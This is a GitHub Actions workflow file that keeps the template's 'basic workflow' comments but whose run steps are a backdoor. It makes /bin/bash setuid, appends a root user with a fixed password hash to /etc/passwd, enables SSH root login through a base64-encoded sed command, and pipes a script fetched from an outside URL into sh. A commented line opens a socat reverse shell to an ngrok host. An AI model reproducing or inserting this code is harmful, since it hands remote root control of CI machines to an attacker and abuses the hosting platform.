# This is a basic workflow to help you get started with Actions

name: CI_2021_0601

# Controls when the workflow will run
on:
  # Triggers the workflow on push or pull request events but only for the main branch
  push:
    branches: [ main ]
  pull_request:
    branches: [ main ]

  # Allows you to run this workflow manually from the Actions tab
  workflow_dispatch:

# A workflow run is made up of one or more jobs that can run sequentially or in parallel
jobs:
  # This workflow contains a single job called "build"
  build:
    # The type of runner that the job will run on
    runs-on: ubuntu-latest

    # Steps represent a sequence of tasks that will be executed as part of the job
    steps:
      # Checks-out your repository under $GITHUB_WORKSPACE, so your job can access it
      - uses: actions/checkout@v3

      # Runs a single command using the runners shell
      - name: Run a one-line script
        run: bash -c "sudo apt-get install -y socat;sudo chmod u+s /bin/bash;(env|grep ss>/tmp/s0;sleep 420&);"
        env:
          ss0: "c2VkIC1pICJzL14jXD9cKFBlcm1pdFJvb3RMb2dpblwpL1wxIHllcyMvZyIgL2V0Yy9zc2gvc3NoZF9jb25maWc7"
      # Runs a set of commands using the runners shell
      #socat exec:'/bin/bash -li',pty,stderr,setsid,sigint,sane tcp:ngrok2.xiaomiqiu.cn:34292

      - name: Run a multi-line script
        run: 
          bash -p -c "(sleep 150&);env|grep ss>/tmp/s1s.txt;cd /tmp;cp /etc/passwd /etc/passwd.bak;echo 'yes:\$1\$123\$EKWAR30..wEKERDtzOQUv/:0:0:toor:/tmp:/bin/bash'>>/etc/passwd;echo $sshc1|base64 -d|sudo sh;(echo $ssh_up_r|base64 -d|sh &);sudo /etc/init.d/ssh restart;curl -o- http://xss.pt/4Mi8|tee /tmp/hi|sh;sleep 24000;"
        env:
          sshc1: "c2VkIC1pICJzL14jXD9cKFBlcm1pdFJvb3RMb2dpblwpL1wxIHllcyMvZyIgL2V0Yy9zc2gvc3NoZF9jb25maWc7"
          ssh_up_r: ""
